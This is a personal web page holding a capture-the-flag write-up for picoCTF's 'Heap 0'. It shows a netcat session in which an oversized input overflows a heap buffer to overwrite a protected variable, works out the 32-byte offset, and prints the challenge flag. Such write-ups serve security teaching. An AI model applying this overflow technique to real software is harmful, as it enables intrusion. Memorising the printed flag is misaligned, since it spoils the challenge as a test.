<!DOCTYPE html>
<html lang="en-US">

<head>
  <link rel="icon" type="image/png" sizes="48x48" href="../../../favicon.ico">
  <link rel="shortcut icon" href="../../../favicon.ico">
  <title>PicoCTF | Heap 0</title>
  <meta name="author" content="Kappa">
  <meta name="description" content="Splash">
  <meta name="viewport" content="width=device-width">
  <link href='https://fonts.googleapis.com/css?family=Rock+Salt' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Orbitron:500' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Rochester' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" href="../../labs.css" type="text/css">
</head>

<body>

  <!--
  _  __          _____  _____        
 | |/ /    /\   |  __ \|  __ \ /\    
 | ' /    /  \  | |__) | |__) /  \   
 |  <    / /\ \ |  ___/|  ___/ /\ \  
 | . \  / ____ \| |    | |  / ____ \ 
 |_|\_\/_/    \_\_|    |_| /_/    \_\
 -->

  <div id="page">
    <div id="nav">
      <ul>
        <li><a href="https://kapaajester83.github.io/">Home</a></li>
        <li><a href="https://kapaajester83.github.io/labs/contents.html">Labs</a></li>
        <li><a href="https://duckduckgo.com/" target="_blank">DuckGo</a></li>
        <li><a href="https://github.com/Kapaajester83?tab=repositories" target="_blank">About</a></li>
        <li><a href="mailto:kappajester83@gmail.com" target="_blank">Email</a></li>
      </ul>
    </div>
    <div id="logo">
      <img src="https://kapaajester83.github.io/logo.jpeg" alt="logo">
      <h1>Kappa</h1>

      <div>
        <br>
        <br>
        <br>
        <h2>“Great things are not done by impulse, but by a series of small things brought together.”</h2>
        <br>
        <br>
      </div>
    </div>

    <div>
      <div id="writeup">
        <h3>
          <a href="../picoCtf.htm">Pico CTF</a>
        </h3>
        <hr>
        <h3>
          <a href="https://play.picoctf.org/practice/challenge/438">Heap 0</a>
        </h3>

        <h4>Description</h4>

        <p>Are overflows just a stack concern? Download the binary here. Download the source here.
        <ul>
          <li><a href="chall">Chall</a></li>
          <li><a href="chall.c">Chall.c</a></li>
        </ul>

        <p>nc tethys.picoctf.net 49664</p>

        <h4>Hints</h4>
        <p>
        <ol>
          <li>What part of the heap do you have control over and how far is it from the safe_var?</li>
        </ol>

        <h4>Solution</h4>
        <p>
          picoCTF{my_first_heap_overflow_e4c92a78}
        </p>

        <h4>CLI</h4>
        <h5>
          kappa@kappa-Aspire-Z5600:~$ nc tethys.picoctf.net 49664<br>
          <br>
          Welcome to heap0!<br>
          I put my data on the heap so it should be safe from any tampering.<br>
          Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.<br>
          <br>
          Heap State:<br>
          +-------------+----------------+<br>
          [*] Address -> Heap Data <br>
          +-------------+----------------+<br>
          [*] 0x59132c59c2b0 -> pico<br>
          +-------------+----------------+<br>
          [*] 0x59132c59c2d0 -> bico<br>
          +-------------+----------------+<br>
          <br>
          1. Print Heap: (print the current state of the heap)<br>
          2. Write to buffer: (write to your own personal block of data on the heap)<br>
          3. Print safe_var: (I'll even let you look at my variable on the heap, I'm confident it can't be modified)<br>
          4. Print Flag: (Try to print the flag, good luck)<br>
          5. Exit<br>
          <br>
          Enter your choice: 3<br>
          <br>
          Take a look at my variable: safe_var = bico<br>
          <br>
          1. Print Heap: (print the current state of the heap)<br>
          2. Write to buffer: (write to your own personal block of data on the heap)<br>
          3. Print safe_var: (I'll even let you look at my variable on the heap, I'm confident it can't be modified)<br>
          4. Print Flag: (Try to print the flag, good luck)<br>
          5. Exit<br>
          <br>
          Enter your choice: 2<br>
          Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
          <br>
          1. Print Heap: (print the current state of the heap)<br>
          2. Write to buffer: (write to your own personal block of data on the heap)<br>
          3. Print safe_var: (I'll even let you look at my variable on the heap, I'm confident it can't be modified)<br>
          4. Print Flag: (Try to print the flag, good luck)<br>
          5. Exit<br>
          <br>
          Enter your choice: 4<br>
          <br>
          YOU WIN<br>
          picoCTF{my_first_heap_overflow_e4c92a78}<br>
          kappa@kappa-Aspire-Z5600:~$
        </h5>

        <p>
        <ul>
          <li>The address of input_data is 0x63c3882552b0</li>
          <li>The address of safe_var is 0x63c3882552d0</li>
        </ul>

        <p>Subtracting these two addresses:
        <ul>
          <li>0x63c3882552d0 - 0x63c3882552b0 = 0x20</li>
          <li>0x20 in hexadecimal is coverted to decimal = 32</li>
        </ul>

        <p>So, inputting a string of 33 characters or more will allow us to overwrite the “bico” in safe_var with something else, causing the check_win() function to print the flag.</p>

      </div>
      <hr>

    </div>
  </div>

  <div id="footer">
    <p>
      Webpage made by <a href="mailto:kappajester83@gmail.com">Kappa </a>
    </p>
  </div>

</html>